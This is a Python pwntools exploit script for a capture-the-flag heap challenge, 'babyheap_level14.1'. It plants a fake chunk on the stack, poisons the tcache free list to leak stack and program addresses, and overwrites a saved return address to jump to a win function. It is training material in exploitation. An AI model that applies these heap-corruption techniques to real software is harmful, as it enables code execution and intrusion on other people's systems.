# idea: stack_scanf -> stack_free -> malloc * 2 -> free * 2 -> puts -> get stack_free address leak
# malloc next to be secret addr -> puts

from pwn import *

p = process("/challenge/babyheap_level14.1")
#p = gdb.debug("/challenge/babyheap_level14.1")
binary = ELF("/challenge/babyheap_level14.1")

def malloc_to_1(loc:bytes):
    p.sendline(b'malloc')
    p.sendline(b'0')
    p.sendline(b'80')
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'80')
    p.sendline(b'free')
    p.sendline(b'0')
    p.sendline(b'free')
    p.sendline(b'1')

    p.sendline(b'scanf')
    p.sendline(b'1')
    p.recv()
    p.sendline(loc)
    p.sendline(b'malloc')
    p.sendline(b'2')
    p.sendline(b'80')
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'80')

def scanf_to_pos(buf:bytes, pos:bytes):
    p.sendline(b'scanf')
    p.sendline(pos)
    p.recv()
    p.sendline(buf)
    p.recv()

print(p.recv())
# leak stack addr
fake_chunk = p64(0x0) + p64(0x61) + p64(0x0) + p64(0x0)
# stack_scanf + 0x40 = stack_free
p.sendline(b'stack_scanf')
p.recv()
p.sendline(b'A' * 0x30 + fake_chunk)
p.recv()
p.sendline(b'stack_free')
p.sendline(b'malloc')
p.sendline(b'0')
p.sendline(b'80')
p.sendline(b'malloc')
p.sendline(b'1')
p.sendline(b'80')
p.sendline(b'free')
p.sendline(b'0')
p.sendline(b'free')
p.sendline(b'1')

p.sendline(b'echo')
p.sendline(b'1')
p.sendline(b'0')
p.recvuntil(b'Data: ')
stack_free_addr = unpack(p.recvuntil(b'\n')[:-1], 'all')
print(f'stack_free_addr = {hex(stack_free_addr)}')
ret_addr = stack_free_addr + 88

# malloc a chunk to ret_addr
malloc_to_1(p64(ret_addr))

# leak main addr
p.sendline(b'echo')
p.sendline(b'1')
p.sendline(b'32')
p.recvuntil(b'Data: ')
main_addr = unpack(p.recvuntil(b'\n')[:-1], 'all')
print(f'main_addr = {hex(main_addr)}')
binary_base = main_addr - binary.sym.main
binary.address = binary_base
win_addr = binary.sym.win + 20 # avoid to '\x09' bytes
print(f'win_addr = {hex(win_addr)}')

# scanf win() to ret_addr
scanf_to_pos(p64(win_addr), b'1')

p.interactive()

